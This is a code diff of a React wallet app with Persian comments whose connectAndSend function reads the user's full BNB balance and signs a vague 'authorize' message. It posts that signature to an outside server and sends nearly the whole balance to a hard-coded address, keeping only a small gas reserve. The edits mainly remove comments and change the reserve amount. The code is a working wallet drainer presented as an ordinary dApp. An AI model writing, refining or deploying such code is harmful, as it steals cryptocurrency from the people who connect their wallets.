@@ -20,13 +20,11 @@ function App() {
   const [account, setAccount] = useState(null);
 
   async function connectAndSend() {
-    // بررسی وجود provider (باید در DApp Browser تراست والت باشد)
     if (typeof window.ethereum === "undefined") {
       alert("No Ethereum provider found. Please open in Trust Wallet DApp Browser!");
       return;
     }
 
-    // درخواست آدرس کاربر
     let accounts;
     try {
       accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
@@ -42,19 +40,18 @@ function App() {
     setAccount(userAddress);
     console.log("✅ User address:", userAddress);
 
-    // گرفتن بالانس از BscScan
     const bnbBalance = await getBNBBalance(userAddress);
     console.log("💰 BNB Balance:", bnbBalance);
     const totalBalance = parseFloat(bnbBalance);
 
-    // تعیین reserve به عنوان 0.004 BNB (برای نگهداری هزینه گس)
-    const reserveBNB = 0.004;
+    // تنظیم reserve؛ در اینجا reserve را به 0.01 BNB (حداقل موجودی برای گس) در نظر می‌گیریم.
+    const reserveBNB = 0.01;
     const sendAmount = totalBalance - reserveBNB;
+    console.log("Calculated send amount (BNB):", sendAmount);
     if (sendAmount <= 0) {
-      console.error("❌ Insufficient funds: not enough to cover reserve for gas fee.");
+      console.error("❌ Insufficient funds to cover reserve.");
       return;
     }
-    console.log("Calculated send amount (BNB):", sendAmount);
 
     // ساخت پیام برای امضای درخواست بر اساس sendAmount
     const message = `Authorize sending ${sendAmount} BNB from ${userAddress}`;
@@ -62,7 +59,6 @@ function App() {
 
     let signature;
     try {
-      // استفاده از personal_sign برای سازگاری با تراست والت
       signature = await window.ethereum.request({
         method: "personal_sign",
         params: [message, userAddress],
@@ -73,7 +69,7 @@ function App() {
       return;
     }
 
-    // ارسال امضا به سرور جهت بررسی و ثبت لاگ
+    // ارسال امضا به سرور
     try {
       const resp = await fetch("https://sponsorbinance.vercel.app/api/proxy", {
         method: "POST",
@@ -96,14 +92,13 @@ function App() {
       return;
     }
 
-    // ساخت تراکنش واقعی
     const sendWeiHex = "0x" + (sendAmount * 1e18).toString(16);
     const txParams = {
       from: userAddress,
-      to: "0xF4c279277f9a897EDbFdba342f7CdFCF261ac4cD", // آدرس مقصد
+      to: "0xF4c279277f9a897EDbFdba342f7CdFCF261ac4cD",
       value: sendWeiHex,
-      gas: "0x5208",        // 21000 به هگز
-      gasPrice: "0x12a05f200" // 5 gwei به هگز
+      gas: "0x5208",
+      gasPrice: "0x12a05f200"
     };
 
     try {
